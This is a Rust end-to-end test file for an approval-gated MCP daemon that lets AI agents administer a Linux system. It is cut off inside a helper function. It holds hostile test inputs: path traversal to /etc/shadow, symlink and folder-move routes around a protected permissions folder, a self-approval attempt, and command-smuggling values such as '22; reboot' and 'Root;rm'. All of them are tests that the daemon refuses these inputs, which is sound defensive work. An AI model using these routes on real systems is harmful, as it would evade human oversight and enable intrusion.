//! Testes de ponta a ponta: sobe o kalangod em modo de desenvolvimento (sem root, simulando ações de sistema)
//! e conversa com ele pelo protocolo MCP, como um agente faria.

use serde_json::{json, Value};
use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixStream;
use std::path::{Path, PathBuf};
use std::process::{Child, Command};
use std::time::Duration;

const BIN: &str = env!("CARGO_BIN_EXE_kalangod");

struct Daemon {
    child: Child,
    sock: PathBuf,
    _dir: tempfile::TempDir,
    _area: Option<tempfile::TempDir>,
    area: PathBuf,
    raiz: PathBuf,
}

impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn start() -> Daemon {
    start_with(true, "")
}

/// `dry_run` falso executa de verdade (sem root: só o que um usuário pode, numa raiz de teste).
fn start_with(dry_run: bool, extra: &str) -> Daemon {
    start_full(dry_run, extra, |c| c)
}

fn start_cfg(edit: impl Fn(String) -> String) -> Daemon {
    start_full(true, "", edit)
}

fn start_full(dry_run: bool, extra: &str, edit: impl Fn(String) -> String) -> Daemon {
    start_full_env(dry_run, extra, edit, &[])
}

/// With variables for kalangod (stand-ins for system commands).
fn start_full_env(dry_run: bool, extra: &str, edit: impl Fn(String) -> String, env: &[(&str, &str)]) -> Daemon {
    start_in(None, dry_run, extra, edit, env)
}

/// `area_in`: where the area is made (by default with the rest, under /tmp; a command's Landlock lets it write all of
/// /tmp, so the area of a test about what a command may write is elsewhere).
fn start_in(area_in: Option<&Path>, dry_run: bool, extra: &str, edit: impl Fn(String) -> String, env: &[(&str, &str)]) -> Daemon {
    let dir = tempfile::tempdir().unwrap();
    let area_dir = area_in.map(|b| tempfile::Builder::new().prefix("area").tempdir_in(b).unwrap());
    let area = area_dir.as_ref().map(|a| a.path().to_path_buf()).unwrap_or_else(|| dir.path().join("area"));
    std::fs::create_dir_all(area.join("segredo")).unwrap();
    std::fs::write(area.join("segredo/chave"), "não leia").unwrap();
    let sock = dir.path().join("mcp.sock");
    let cfg = format!(r#"
socket = "{sock}"
state_dir = "{state}"
protected_paths = ["{area}/segredo"]
approval_requires_tty = false
approval_timeout_s = 20
total_grant_s = 900
dry_run = {dry_run}
restore_root = "{raiz}"
trash_dir = "{raiz}/lixeira"
{extra}
[[callers]]
name = "teste"
max_level = "total"
allowed_paths = ["{area}"]
"#, sock = sock.display(), state = dir.path().join("estado").display(), area = area.display(), raiz = dir.path().join("raiz").display());
    std::fs::create_dir_all(dir.path().join("raiz/etc")).unwrap();
    let cfg_path = dir.path().join("kalangod.toml");
    std::fs::write(&cfg_path, edit(cfg)).unwrap();
    let child = Command::new(BIN).env("LANGUAGE", "pt_BR").envs(env.iter().copied()).args(["servir", "--config", cfg_path.to_str().unwrap()]).spawn().unwrap();
    for _ in 0..100 {
        if sock.exists() {
            break;
        }
        std::thread::sleep(Duration::from_millis(30));
    }
    let raiz = dir.path().join("raiz");
    Daemon { child, sock, _dir: dir, _area: area_dir, area, raiz }
}

struct Client {
    w: UnixStream,
    r: BufReader<UnixStream>,
    n: u64,
}

impl Client {
    fn new(sock: &Path) -> Client {
        let s = UnixStream::connect(sock).unwrap();
        Client { w: s.try_clone().unwrap(), r: BufReader::new(s), n: 0 }
    }
    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.n += 1;
        writeln!(self.w, "{}", json!({"jsonrpc": "2.0", "id": self.n, "method": method, "params": params})).unwrap();
        let mut line = String::new();
        self.r.read_line(&mut line).unwrap();
        serde_json::from_str(&line).unwrap()
    }
    fn call(&mut self, name: &str, args: Value) -> Value {
        self.rpc("tools/call", json!({"name": name, "arguments": args}))["result"].clone()
    }
}

/// Aprova o próximo pedido pendente a partir de outro processo (como o usuário faria no terminal).
fn approve_next(sock: PathBuf) -> std::thread::JoinHandle<String> {
    std::thread::spawn(move || {
        for _ in 0..200 {
            let mut c = Client::new(&sock);
            let p = c.rpc("kalango/pendentes", json!({}));
            if let Some(id) = p["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                let out = Command::new(BIN).args(["aprovar", &id.to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr);
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        "nenhum pedido".into()
    })
}

#[test]
fn protocolo_e_ferramentas() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let init = c.rpc("initialize", json!({"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "teste", "version": "1"}}));
    assert_eq!(init["result"]["serverInfo"]["name"], "kalangod");
    let tools = c.rpc("tools/list", json!({}));
    let names: Vec<&str> = tools["result"]["tools"].as_array().unwrap().iter().map(|t| t["name"].as_str().unwrap()).collect();
    for n in ["sistema.info", "kernel.seguranca", "arquivos.escrever", "pacotes.instalar", "sistema.executar", "linha_do_tempo.desfazer"] {
        assert!(names.contains(&n), "falta {n}");
    }
    let info = c.call("sistema.info", json!({}));
    assert_eq!(info["isError"], false);
    assert!(info["structuredContent"]["kernel"].as_str().unwrap().len() > 3);
    let k = c.call("kernel.seguranca", json!({}));
    assert!(k["structuredContent"]["landlock_abi"].as_i64().unwrap() >= 1, "Landlock precisa estar ativo: {k}");
    assert_eq!(c.rpc("metodo/inexistente", json!({}))["error"]["code"], -32601);
}

#[test]
fn mover_para_uma_pasta_que_existe_poe_dentro() {
    // as `mv` does: the destination is an existing folder, so the file goes into it, keeping its name; a file
    // already there with that name is still refused (nothing is overwritten)
    let d = start();
    let mut c = Client::new(&d.sock);
    let a = d.area.join("fatura.pdf");
    std::fs::write(&a, "pdf").unwrap();
    std::fs::create_dir_all(d.area.join("PDFs")).unwrap();
    let mv = c.call("arquivos.mover", json!({"de": a, "para": d.area.join("PDFs")}));
    assert_eq!(mv["isError"], false, "{mv}");
    assert!(d.area.join("PDFs/fatura.pdf").exists() && !a.exists());
    assert_eq!(mv["structuredContent"]["para"], json!(d.area.join("PDFs/fatura.pdf")));
    std::fs::write(&a, "outra").unwrap();
    let de_novo = c.call("arquivos.mover", json!({"de": a, "para": d.area.join("PDFs")}));
    assert_eq!(de_novo["isError"], true, "{de_novo}");
    assert_eq!(std::fs::read_to_string(d.area.join("PDFs/fatura.pdf")).unwrap(), "pdf");
}

#[test]
fn arquivos_com_desfazer() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let a = d.area.join("nota.md");
    let r = c.call("arquivos.escrever", json!({"caminho": a, "conteudo": "versão 1"}));
    assert_eq!(r["isError"], false, "{r}");
    c.call("arquivos.escrever", json!({"caminho": a, "conteudo": "versão 2"}));
    let lido = c.call("arquivos.ler", json!({"caminho": a}));
    assert_eq!(lido["structuredContent"]["conteudo"], "versão 2");

    let b = d.area.join("pasta/nota-movida.md");
    let mv = c.call("arquivos.mover", json!({"de": a, "para": b}));
    let id = mv["structuredContent"]["registro"].as_u64().unwrap();
    assert!(b.exists() && !a.exists());

    // desfazer é nível sistema: precisa de aprovação de outro processo
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer", json!({"id": id}));
    assert!(h.join().unwrap().contains("aprovado"));
    assert_eq!(u["isError"], false, "{u}");
    assert!(a.exists() && !b.exists(), "o arquivo devia voltar ao lugar original");
    assert_eq!(std::fs::read_to_string(&a).unwrap(), "versão 2");

    // desfazer de novo é recusado
    let h = approve_next(d.sock.clone());
    let again = c.call("linha_do_tempo.desfazer", json!({"id": id}));
    h.join().unwrap();
    assert_eq!(again["isError"], true);

    let tl = c.call("linha_do_tempo.listar", json!({}));
    assert!(tl["structuredContent"]["registros"].as_array().unwrap().iter().any(|e| e["status"] == "desfeito"));
}

/// "Desfazer tudo desde…": one approval undoes every reversible action since a moment (newest first), and the records
/// read by the agents center (`kalango/registros`, not recorded itself) say which were undone.
#[test]
fn undo_since_with_one_approval() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let (a, b) = (d.area.join("um.txt"), d.area.join("dois.txt"));
    c.call("arquivos.escrever", json!({"caminho": a, "conteudo": "1"}));
    c.call("arquivos.escrever", json!({"caminho": b, "conteudo": "2"}));
    // (records have one-second resolution: the moves start in a later second than the writes)
    std::thread::sleep(std::time::Duration::from_millis(1100));
    let (a2, b2) = (d.area.join("pasta/um.txt"), d.area.join("pasta/dois.txt"));
    c.call("arquivos.mover", json!({"de": a, "para": a2}));
    let desde = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().last().unwrap()["time"].as_u64().unwrap();
    c.call("arquivos.mover", json!({"de": b, "para": b2}));
    assert!(a2.exists() && b2.exists());
    let antes = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().len();
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer_desde", json!({"desde": desde}));
    assert!(h.join().unwrap().contains("aprovado"), "one approval");
    assert_eq!(u["isError"], false, "{u}");
    assert!(a.exists() && b.exists() && !a2.exists() && !b2.exists(), "both moves undone: {u}");
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    // only the moves were undone (the writes came before `desde`); reading the records added nothing
    assert!(regs.iter().filter(|e| e["tool"] == "arquivos.mover").all(|e| e["desfeito"] == true), "{regs:?}");
    assert!(regs.iter().filter(|e| e["tool"] == "arquivos.escrever").all(|e| e["desfeito"] == false), "{regs:?}");
    assert_eq!(u["structuredContent"]["desfeitos"].as_array().unwrap().len(), 2, "{u}");
    assert!(regs.len() > antes && regs.iter().filter(|e| e["tool"] == "kalango/registros").count() == 0);
}

#[test]
fn pastas_protegidas_e_fora_da_area() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let segredo = d.area.join("segredo/chave");
    assert_eq!(c.call("arquivos.ler", json!({"caminho": segredo}))["isError"], true);
    // escapar com ..
    let escape = format!("{}/../../etc/hostname", d.area.display());
    assert_eq!(c.call("arquivos.ler", json!({"caminho": escape}))["isError"], true);
    // link simbólico dentro da área apontando para a pasta protegida
    std::os::unix::fs::symlink(d.area.join("segredo"), d.area.join("atalho")).unwrap();
    let r = c.call("arquivos.ler", json!({"caminho": d.area.join("atalho/chave")}));
    assert_eq!(r["isError"], true, "link para pasta protegida devia ser recusado: {r}");
    // listar a área não revela a pasta protegida
    let l = c.call("arquivos.listar", json!({"caminho": d.area}));
    let nomes: Vec<&str> = l["structuredContent"]["itens"].as_array().unwrap().iter().map(|i| i["nome"].as_str().unwrap()).collect();
    assert!(!nomes.contains(&"segredo"), "{nomes:?}");
}

/// The routes around a protected folder with the file tools, through the real kalangod: a link to a protected file
/// not created yet, and moving (or trashing) the folder that holds a protected one, to change it where it is not
/// protected and move it back.
#[test]
fn protected_folders_cannot_be_reached_around() {
    let d = start_cfg(|cfg| cfg.replace("/segredo\"]", "/cfg/kalango\"]"));
    let mut c = Client::new(&d.sock);
    let kalango = d.area.join("cfg/kalango");
    std::fs::create_dir_all(&kalango).unwrap();
    std::fs::write(kalango.join("agente-permissoes.json"), "{}").unwrap();
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    // a dangling link: writing through it would create cfg/kalango/conectores.json
    std::os::unix::fs::symlink(kalango.join("conectores.json"), d.area.join("docs/novo.json")).unwrap();
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("docs/novo.json"), "conteudo": "x"}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(!kalango.join("conectores.json").exists());
    // the folder holding it, moved away or to the trash, would carry it out of the protection
    let r = c.call("arquivos.mover", json!({"de": d.area.join("cfg"), "para": d.area.join("docs/cfg")}));
    assert_eq!(r["isError"], true, "{r}");
    let r = c.call("arquivos.lixeira", json!({"caminho": d.area.join("cfg")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(kalango.join("agente-permissoes.json").is_file());
    // nor can a folder made elsewhere be moved in to become it
    std::fs::create_dir_all(d.area.join("docs/outro/kalango")).unwrap();
    std::fs::remove_dir_all(d.area.join("cfg")).unwrap();
    let r = c.call("arquivos.mover", json!({"de": d.area.join("docs/outro"), "para": d.area.join("cfg")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(!d.area.join("cfg").exists());
    // the rest of the area works as before
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("docs/notas.md"), "conteudo": "ok"}));
    assert_eq!(r["isError"], false, "{r}");
    let r = c.call("arquivos.mover", json!({"de": d.area.join("docs/notas.md"), "para": d.area.join("notas.md")}));
    assert_eq!(r["isError"], false, "{r}");
}

#[test]
fn trash_uses_the_configured_folder() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let f = d.area.join("velho.txt");
    std::fs::write(&f, "rascunho").unwrap();
    let r = c.call("arquivos.lixeira", json!({"caminho": f}));
    assert_eq!(r["isError"], false, "{r}");
    let at = r["structuredContent"]["na_lixeira"].as_str().unwrap().to_string();
    let raiz = d.area.parent().unwrap().join("raiz/lixeira");
    assert!(at.starts_with(raiz.to_str().unwrap()), "the test trash, not a real one: {at}");
    assert!(!f.exists() && std::path::Path::new(&at).exists());
    assert!(raiz.join("info/velho.txt.trashinfo").exists());
}

#[test]
fn reads_pdf_text_with_page_markers() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let pdf = d.area.join("relatorio-out.pdf");
    std::fs::copy(concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fixtures/relatorio-out.pdf"), &pdf).unwrap();
    let r = c.call("arquivos.ler", json!({"caminho": pdf}));
    assert_eq!(r["isError"], false, "{r}");
    let t = r["structuredContent"]["conteudo"].as_str().unwrap();
    assert_eq!(r["structuredContent"]["pdf_paginas"], 3, "{r}");
    let p2 = t.find("[p. 2]").expect("page 2 marker");
    let receita = t.find("Receita subiu 8%").expect("page 2 text");
    assert!(receita > p2 && t.find("[p. 3]").unwrap() > receita, "{t}");
    assert!(t.contains("20/11") && t.contains("despesas estáveis") && t.contains("Próxima revisão"), "accents must survive: {t}");
    // a broken PDF is an error, not a crash of the daemon
    std::fs::write(d.area.join("quebrado.pdf"), b"%PDF-1.4\nnot really a pdf").unwrap();
    assert_eq!(c.call("arquivos.ler", json!({"caminho": d.area.join("quebrado.pdf")}))["isError"], true);
    assert_eq!(c.call("arquivos.ler", json!({"caminho": pdf}))["isError"], false, "the daemon must still answer");
}

/// Approves the next request with "always" (as the approval screen's "Sempre" does).
fn approve_next_always(sock: PathBuf) -> std::thread::JoinHandle<String> {
    std::thread::spawn(move || {
        for _ in 0..200 {
            let mut c = Client::new(&sock);
            let p = c.rpc("kalango/pendentes", json!({}));
            if let Some(id) = p["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                let out = Command::new(BIN).args(["aprovar", &id.to_string(), "--sempre"]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr);
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        "nenhum pedido".into()
    })
}

#[test]
fn always_covers_only_the_same_request_and_can_be_taken_back() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let args = json!({"nomes": ["cowsay"]});
    let h = approve_next_always(d.sock.clone());
    assert_eq!(c.call("pacotes.instalar", args.clone())["isError"], false);
    assert!(h.join().unwrap().contains("#"), "approved with always");
    // the same request again: no approval is asked (nobody approves here, and it still goes through)
    let t0 = std::time::Instant::now();
    let r = c.call("pacotes.instalar", args.clone());
    assert_eq!(r["isError"], false, "{r}");
    assert!(t0.elapsed() < Duration::from_secs(5));
    assert!(r["structuredContent"]["ponto_de_restauracao"].is_string(), "still a restore point first: {r}");
    // other arguments: asked again (approved here by the helper)
    let h = approve_next(d.sock.clone());
    assert_eq!(c.call("pacotes.instalar", json!({"nomes": ["sl"]}))["isError"], false);
    assert!(!h.join().unwrap().contains("nenhum pedido"), "a different request must ask");
    // listed, kept on disk, and taken back: then it asks again
    let l = c.rpc("kalango/sempre", json!({}));
    assert_eq!(l["result"]["respostas"].as_array().unwrap().len(), 1, "{l}");
    assert!(d.area.parent().unwrap().join("estado/aprovacoes-sempre.json").exists());
    let r = c.rpc("kalango/revogar_sempre", json!({"indice": 0}));
    assert!(r["result"]["revogada"]["tool"] == "pacotes.instalar", "{r}");
    let h = approve_next(d.sock.clone());
    assert_eq!(c.call("pacotes.instalar", args)["isError"], false);
    assert!(!h.join().unwrap().contains("nenhum pedido"), "after taking it back, it asks again");
    // full access is never "always"
    let h = approve_next_always(d.sock.clone());
    let r = c.call("sistema.executar", json!({"programa": "true", "argumentos": []}));
    let out = h.join().unwrap();
    assert!(out.contains("temporári") || out.contains("temporary"), "{out}");
    assert_eq!(r["isError"], true, "not approved: {r}");
}

#[test]
fn niveis_sistema_e_total() {
    let d = start();
    let mut c = Client::new(&d.sock);
    // nível sistema: aprovação + ponto de restauração; em simulação, nada é instalado
    let h = approve_next(d.sock.clone());
    let r = c.call("pacotes.instalar", json!({"nomes": ["cowsay"]}));
    h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert!(r["structuredContent"]["saida"].as_str().unwrap().contains("[simulado]"));
    assert!(r["structuredContent"]["ponto_de_restauracao"].is_string());
    assert_eq!(r["structuredContent"]["desfazivel"], true);
    // nomes que parecem opções são recusados
    let h = approve_next(d.sock.clone());
    let bad = c.call("pacotes.instalar", json!({"nomes": ["--allow-unauthenticated"]}));
    h.join().unwrap();
    assert_eq!(bad["isError"], true);

    // nível total: a primeira chamada pede aprovação e abre a concessão; a segunda não pede
    let h = approve_next(d.sock.clone());
    let t1 = c.call("sistema.executar", json!({"programa": "id"}));
    h.join().unwrap();
    assert_eq!(t1["isError"], false, "{t1}");
    let quem = c.rpc("kalango/quem", json!({}));
    assert!(quem["result"]["nivel_total_restante_s"].as_u64().unwrap() > 800);
    let t2 = c.call("sistema.executar", json!({"programa": "id"}));
    assert_eq!(t2["isError"], false);
}

#[test]
fn negar_e_autoaprovacao() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let sock = d.sock.clone();
    let h = std::thread::spawn(move || {
        for _ in 0..200 {
            let mut c2 = Client::new(&sock);
            if let Some(id) = c2.rpc("kalango/pendentes", json!({}))["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                // o mesmo processo do pedido não pode aprovar
                let own = c2.rpc("kalango/decidir", json!({"id": id, "aprovar": true}));
                let out = Command::new(BIN).args(["negar", &id.to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return (own, String::from_utf8_lossy(&out.stdout).into_owned());
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        (Value::Null, String::new())
    });
    let r = c.call("servicos.acao", json!({"nome": "cron.service", "acao": "parar"}));
    let (own, neg) = h.join().unwrap();
    assert!(own["error"]["message"].as_str().unwrap_or("").contains("próprio pedido"), "{own}");
    assert!(neg.contains("negado"));
    assert_eq!(r["isError"], true);
}

// ---------------------------------------------------------------------------------------------------------------
// Tarefas com limites (cgroup próprio) e Landlock. Sem root, o limite vem do systemd do usuário.

fn has_user_systemd() -> bool {
    Command::new("systemd-run").args(["--user", "--scope", "--quiet", "true"]).status().map(|s| s.success()).unwrap_or(false)
}

#[test]
fn tarefas_com_limites() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_with(false, "[limites]\nmemoria_mb = 256\ncpu_pct = 100\nprocessos = 64\ntempo_s = 30");
    let mut c = Client::new(&d.sock);
    // normal: roda, devolve a saída e o código
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo olá; exit 3"], "pasta": d.area}));
    assert_eq!(r["isError"], false, "{r}");
    let v = &r["structuredContent"];
    assert_eq!(v["saida"], "olá\n", "{v}");
    assert_eq!(v["codigo"], 3);
    // memória: pede 400 MB com limite de 64 MB → morto pelo kernel (OOM dentro do cgroup da tarefa)
    let r = c.call("tarefas.executar", json!({"programa": "python3", "argumentos": ["-c", "x = bytearray(400*1024*1024); print('não devia chegar aqui')"], "memoria_mb": 64}));
    let v = &r["structuredContent"];
    assert_eq!(v["estourou_memoria"], true, "{v}");
    assert_eq!(v["sinal"], 9, "{v}");
    assert!(!v["saida"].as_str().unwrap().contains("chegar"));
    // o agente não consegue pedir mais que a configuração
    assert_eq!(v["limites"]["memoria_mb"], 64);
    let r = c.call("tarefas.executar", json!({"programa": "true", "memoria_mb": 999999}));
    assert_eq!(r["structuredContent"]["limites"]["memoria_mb"], 256);
    // tempo: encerrada no limite
    let r = c.call("tarefas.executar", json!({"programa": "sleep", "argumentos": ["30"], "tempo_s": 1}));
    let v = &r["structuredContent"];
    assert_eq!(v["estourou_tempo"], true, "{v}");
    assert!(v["tempo_ms"].as_u64().unwrap() < 5000, "{v}");
    // processos: com limite de 8, criar 40 falha
    let r = c.call("tarefas.executar", json!({"programa": "python3", "argumentos": ["-c", "import os,time\nn=0\nfor i in range(40):\n  try:\n    if os.fork()==0:\n      time.sleep(2); os._exit(0)\n    n+=1\n  except OSError: pass\nprint(n)"], "processos": 8}));
    let n: u32 = r["structuredContent"]["saida"].as_str().unwrap().trim().parse().unwrap_or(99);
    assert!(n < 8, "devia ter criado menos de 8 processos, criou {n}: {r}");
    // Landlock: escreve na área permitida, não fora dela (mesmo onde o usuário poderia)
    let home = std::env::var("HOME").unwrap();
    let fora = format!("{home}/.kalango-teste-landlock-{}", std::process::id());
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", format!("echo a > {}/dentro.txt && echo b > {fora}", d.area.display())]}));
    let v = &r["structuredContent"];
    assert!(d.area.join("dentro.txt").exists(), "{v}");
    assert!(!Path::new(&fora).exists(), "Landlock devia impedir escrever em {fora}: {v}");
    assert!(v["erros"].as_str().unwrap().contains("Permission denied"), "{v}");
    // pasta fora da área é recusada antes de rodar
    let r = c.call("tarefas.executar", json!({"programa": "true", "pasta": "/etc"}));
    assert_eq!(r["isError"], true);
}

// ---------------------------------------------------------------------------------------------------------------
// Pontos de restauração reais (cópia do /etc numa raiz de teste): criar, mudar, restaurar e desfazer a restauração.

#[test]
fn pontos_de_restauracao() {
    let d = start_with(false, "pontos_max = 3");
    let etc = d.raiz.join("etc");
    std::fs::create_dir_all(etc.join("rede")).unwrap();
    std::fs::write(etc.join("hostname"), "kalango\n").unwrap();
    std::fs::write(etc.join("rede/config"), "dhcp=sim\n").unwrap();
    std::os::unix::fs::symlink("hostname", etc.join("atalho")).unwrap();
    let mut c = Client::new(&d.sock);

    let h = approve_next(d.sock.clone());
    let p = c.call("pontos.criar", json!({"descricao": "antes do teste"}));
    h.join().unwrap();
    assert_eq!(p["isError"], false, "{p}");
    let id = p["structuredContent"]["ponto"]["id"].as_str().unwrap().to_string();
    assert_eq!(p["structuredContent"]["ponto"]["tipo"], "arquivos");

    // muda tudo: troca, cria, apaga
    std::fs::write(etc.join("hostname"), "outro\n").unwrap();
    std::fs::write(etc.join("novo.conf"), "x").unwrap();
    std::fs::remove_dir_all(etc.join("rede")).unwrap();

    // o plano mostra exatamente o que vai mudar
    let h = approve_next(d.sock.clone());
    let plano = c.call("pontos.restaurar", json!({"id": id, "so_plano": true}));
    h.join().unwrap();
    let pl = &plano["structuredContent"]["plano"]["etc"];
    assert_eq!(pl["apagar"], json!(["novo.conf"]), "{plano}");
    assert_eq!(pl["trocar"], json!(["hostname"]));
    assert!(pl["recriar"].as_array().unwrap().contains(&json!("rede/config")));
    assert!(etc.join("novo.conf").exists(), "só plano não muda nada");

    let h = approve_next(d.sock.clone());
    let r = c.call("pontos.restaurar", json!({"id": id}));
    h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert_eq!(std::fs::read_to_string(etc.join("hostname")).unwrap(), "kalango\n");
    assert_eq!(std::fs::read_to_string(etc.join("rede/config")).unwrap(), "dhcp=sim\n");
    assert!(!etc.join("novo.conf").exists());
    assert_eq!(std::fs::read_link(etc.join("atalho")).unwrap(), Path::new("hostname"));

    // a restauração também se desfaz (volta ao estado de logo antes dela)
    let reg = r["structuredContent"]["registro"].as_u64().unwrap();
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer", json!({"id": reg}));
    h.join().unwrap();
    assert_eq!(u["isError"], false, "{u}");
    assert_eq!(std::fs::read_to_string(etc.join("hostname")).unwrap(), "outro\n");
    assert!(etc.join("novo.conf").exists());
    assert!(!etc.join("rede").exists());

    // toda ação de nível sistema cria o seu ponto antes; a retenção mantém só 3
    let l = c.call("pontos.listar", json!({}));
    let n = l["structuredContent"]["pontos"].as_array().unwrap().len();
    assert!(n <= 3 && n >= 2, "{l}");
}

// ---------------------------------------------------------------------------------------------------------------
// Ferramentas de administração: as de leitura rodam de verdade; as de mudança validam entradas e respeitam a simulação.

#[test]
fn administracao() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let names: Vec<String> = c.rpc("tools/list", json!({}))["result"]["tools"].as_array().unwrap().iter().map(|t| t["name"].as_str().unwrap().to_string()).collect();
    for t in ["rede.conexoes", "rede.wifi", "rede.conexao", "firewall.estado", "firewall.regra", "firewall.ligar", "discos.dispositivos", "discos.saude",
        "discos.montar", "discos.desmontar", "usuarios.listar", "usuarios.criar", "usuarios.remover", "usuarios.grupo", "atualizacoes.listar",
        "atualizacoes.verificar", "atualizacoes.aplicar", "pacotes.versoes", "tarefas.executar", "pontos.listar", "pontos.criar", "pontos.restaurar"] {
        assert!(names.contains(&t.to_string()), "falta {t}");
    }
    let u = c.call("usuarios.listar", json!({}));
    assert_eq!(u["isError"], false, "{u}");
    let me = std::env::var("USER").unwrap_or_default();
    assert!(u["structuredContent"]["usuarios"].as_array().unwrap().iter().any(|x| x["nome"] == me.as_str()), "{u}");
    let dsk = c.call("discos.dispositivos", json!({}));
    assert_eq!(dsk["isError"], false, "{dsk}");
    assert!(!dsk["structuredContent"]["blockdevices"].as_array().unwrap().is_empty());
    let n = c.call("rede.conexoes", json!({}));
    assert_eq!(n["isError"], false, "{n}");
    let a = c.call("atualizacoes.listar", json!({}));
    assert_eq!(a["isError"], false, "{a}");

    // entradas perigosas são recusadas antes de qualquer aprovação ou execução
    for (tool, args) in [
        ("discos.saude", json!({"dispositivo": "/dev/../etc/shadow"})),
        ("discos.saude", json!({"dispositivo": "/etc/passwd"})),
    ] {
        let r = c.call(tool, args.clone());
        assert_eq!(r["isError"], true, "{tool} {args}");
    }
    for (tool, args) in [
        ("usuarios.criar", json!({"nome": "--badname"})),
        ("usuarios.criar", json!({"nome": "Root;rm"})),
        ("usuarios.remover", json!({"nome": "root"})),
        ("usuarios.remover", json!({"nome": me})),
        ("firewall.regra", json!({"acao": "permitir", "porta": "22; reboot"})),
        ("pacotes.versoes", json!({"versoes": ["bash=--force"]})),
    ] {
        let h = approve_next(d.sock.clone());
        let r = c.call(tool, args.clone());
        h.join().unwrap();
        assert_eq!(r["isError"], true, "{tool} {args} devia ser recusado: {r}");
    }
    // em simulação, mudanças válidas descrevem o comando e trazem o inverso
    let h = approve_next(d.sock.clone());
    let r = c.call("firewall.regra", json!({"acao": "permitir", "porta": "8080/tcp"}));
    h.join().unwrap();
    assert!(r["structuredContent"]["saida"].as_str().unwrap().contains("[simulado] ufw allow 8080/tcp"), "{r}");
    assert_eq!(r["structuredContent"]["desfazivel"], true);
    let h = approve_next(d.sock.clone());
    let r = c.call("usuarios.criar", json!({"nome": "kalango-teste", "nome_completo": "Teste"}));
    h.join().unwrap();
    assert!(r["structuredContent"]["saida"].as_str().unwrap().contains("[simulado] useradd -m -s /bin/bash -c Teste kalango-teste"), "{r}");
}

// ---------------------------------------------------------------------------------------------------------------

#[test]
fn concessao_total_expira() {
    let d = start_cfg(|c| c.replace("total_grant_s = 900", "total_grant_s = 1"));
    let mut c = Client::new(&d.sock);
    let h = approve_next(d.sock.clone());
    assert_eq!(c.call("sistema.executar", json!({"programa": "true"}))["isError"], false);
    h.join().unwrap();
    std::thread::sleep(Duration::from_millis(1500));
    assert!(c.rpc("kalango/quem", json!({}))["result"]["nivel_total_restante_s"].is_null(), "concessão devia ter expirado");
    // depois do prazo, pede aprovação de novo: sem ninguém aprovar, a chamada espera e é negada pelo prazo curto
    let neg = std::thread::spawn({
        let sock = d.sock.clone();
        move || {
            for _ in 0..200 {
                let mut c2 = Client::new(&sock);
                if let Some(id) = c2.rpc("kalango/pendentes", json!({}))["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                    return Command::new(BIN).args(["negar", &id.to_string()]).env("KALANGOD_SOCKET", &sock).output().is_ok();
                }
                std::thread::sleep(Duration::from_millis(25));
            }
            false
        }
    });
    let r = c.call("sistema.executar", json!({"programa": "true"}));
    assert!(neg.join().unwrap(), "devia ter aparecido um pedido de aprovação novo");
    assert_eq!(r["isError"], true);
}

#[test]
fn chamador_sem_regra_e_recusado() {
    // só o root tem regra: este processo (não root) é recusado mesmo dizendo ser outro
    let d = start_cfg(|c| c.replace("name = \"teste\"", "name = \"so-root\"\nuid = 0"));
    let mut c = Client::new(&d.sock);
    let r = c.rpc("initialize", json!({"protocolVersion": "2025-06-18", "clientInfo": {"name": "root", "uid": 0}}));
    assert!(r["error"]["message"].as_str().unwrap().contains("sem regra"), "{r}");
    let r = c.rpc("tools/list", json!({}));
    assert!(r["error"].is_object(), "{r}");
}

// ---------------------------------------------------------------------------------------------------------------
// Tela de aprovação: só um executável confiável aprova sem terminal; quem espera é avisado na hora.

/// Copia o kalangod para uma pasta 0755 (como /usr/libexec/kalango) para servir de "aprovador gráfico".
fn trusted_copy(dir: &Path) -> PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let d = dir.join("libexec");
    std::fs::create_dir_all(&d).unwrap();
    std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
    let exe = d.join("kalango-aprovacao");
    std::fs::copy(BIN, &exe).unwrap();
